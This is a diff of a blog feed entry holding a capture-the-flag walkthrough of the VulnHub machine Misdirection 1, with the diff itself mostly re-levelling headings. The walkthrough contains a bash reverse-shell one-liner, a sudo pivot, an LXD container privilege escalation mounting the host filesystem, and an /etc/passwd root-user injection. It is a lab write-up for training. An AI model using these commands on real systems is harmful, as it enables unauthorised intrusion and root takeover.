@@ -5,7 +5,6 @@
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -13,15 +12,14 @@
 &lt;td>Beginner&lt;/td>
 &lt;td>24 Sep 2019&lt;/td>
 &lt;td>FalconSpy&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/misdirection-1,371/">https://vulnhub.com/entry/misdirection-1,371/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
-&lt;h1 id="summary">Summary&lt;/h1>
+&lt;h2 id="summary">Summary&lt;/h2>
 &lt;p>For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
 and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
 privileged container that can read and write the whole file system by mounting it in the container.&lt;/p>
-&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
 &lt;p>Nmap&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
 Host is up &lt;span style="color:#f92672">(&lt;/span>0.00032s latency&lt;span style="color:#f92672">)&lt;/span>.
@@ -31,8 +29,8 @@ PORT STATE SERVICE VERSION
 80/tcp open http Rocket httpd 1.2.6 &lt;span style="color:#f92672">(&lt;/span>Python 2.7.15rc1&lt;span style="color:#f92672">)&lt;/span>
 3306/tcp open mysql MySQL &lt;span style="color:#f92672">(&lt;/span>unauthorized&lt;span style="color:#f92672">)&lt;/span>
 8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
-&lt;h2 id="8080-http">8080 (HTTP)&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="8080-http">8080 (HTTP)&lt;/h3>
 &lt;p>Nmap&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span>
 Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
@@ -69,7 +67,7 @@ server-status &lt;span style="color:#f92672">[&lt;/span>Status: 403, Size: 305, 
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
 contains a web shell.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-1.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
+&lt;h2 id="shell-as-www-data">Shell as www-data&lt;/h2>
 &lt;p>Supplying the following command we are able to get a reverse shell.&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">bash -c &lt;span style="color:#e6db74">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>shell:&lt;/p>
@@ -77,13 +75,13 @@ contains a web shell.&lt;/p>
 &lt;p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
 any password requirement.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-3.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="shell-as-brexit">Shell as brexit&lt;/h1>
+&lt;h2 id="shell-as-brexit">Shell as brexit&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo -u brexit /bin/bash
 &lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-4.png" class="center" style="border-radius: 8px;" />
 &lt;p>On running id we see that brexit is in the lxd group and no images are present.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-10.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;h2 id="shell-as-root">Shell as root&lt;/h2>
 &lt;p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p>
 &lt;p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
@@ -119,7 +117,7 @@ lxc exec privesc /bin/sh
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-8.png" class="center" style="border-radius: 8px;" />
 &lt;p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-9.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="extras">Extras&lt;/h1>
+&lt;h2 id="extras">Extras&lt;/h2>
 &lt;p>After looking at other writeups, there was another easy privesc that I didn&amp;rsquo;t explore.&lt;/p>
 &lt;ul>
 &lt;li>Writeable /etc/passwd file&lt;/li>
@@ -131,7 +129,7 @@ lxc exec privesc /bin/sh
 echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt;/etc/passwd
 &lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-12.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="references">References&lt;/h1>
+&lt;h2 id="references">References&lt;/h2>
 &lt;p>&lt;a href="https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/">https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd&lt;/a>&lt;/p></content></item></channel></rss>
